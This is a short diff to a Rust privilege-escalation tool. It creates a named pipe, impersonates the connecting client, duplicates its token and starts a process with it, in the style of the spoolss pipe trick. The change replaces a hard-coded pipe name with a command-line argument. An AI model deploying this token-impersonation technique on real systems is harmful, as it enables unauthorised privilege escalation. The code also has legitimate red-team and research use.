@@ -1,4 +1,4 @@
-use std::{env, ptr, mem};
+use std::{env, ptr, mem, str, process};
 
 use windows::Win32::Security::{DuplicateTokenEx, TOKEN_TYPE, SECURITY_IMPERSONATION_LEVEL, TOKEN_ACCESS_MASK};
 use windows::Win32::Security::{GetTokenInformation, TOKEN_INFORMATION_CLASS, Authorization::ConvertSidToStringSidW, TOKEN_USER};
@@ -7,14 +7,20 @@ use windows::Win32::System::Pipes::{CreateNamedPipeA, ConnectNamedPipe, Imperson
 use windows::Win32::Foundation::{HANDLE, WIN32_ERROR, GetLastError, INVALID_HANDLE_VALUE};
 use windows::Win32::System::Threading::{GetCurrentThread, OpenThreadToken, CreateProcessWithTokenW, CREATE_PROCESS_LOGON_FLAGS, STARTUPINFOW, PROCESS_INFORMATION};
 use windows::core::{PCSTR, PWSTR, PCWSTR};
-use windows::{w, s};
+use windows::{w};
 use std::ffi::c_void;
 
 fn main() {
+    let args: Vec<String> = env::args().collect();
+    if args.len() < 2 {
+        println!(r"Usage: token_impersonation.exe \\.\pipe\pipename");
+        process::exit(1);
+    }
+    let mut pipename: Vec<u8> = [args[1].as_bytes(), "\0".as_bytes()].concat();
     
     unsafe {
-        let p_name: PCSTR = s!(r"\\.\pipe\test\pipe\spoolss");
-        println!("[+] Creating named pipe {}", p_name.to_string().unwrap());
+        let p_name: PCSTR = PCSTR::from_raw(pipename.as_mut_ptr());
+        println!("[+] Creating named pipe {}", str::from_utf8(&pipename).unwrap());
         let h_pipe: HANDLE = CreateNamedPipeA(
             p_name,
             PIPE_ACCESS_DUPLEX,
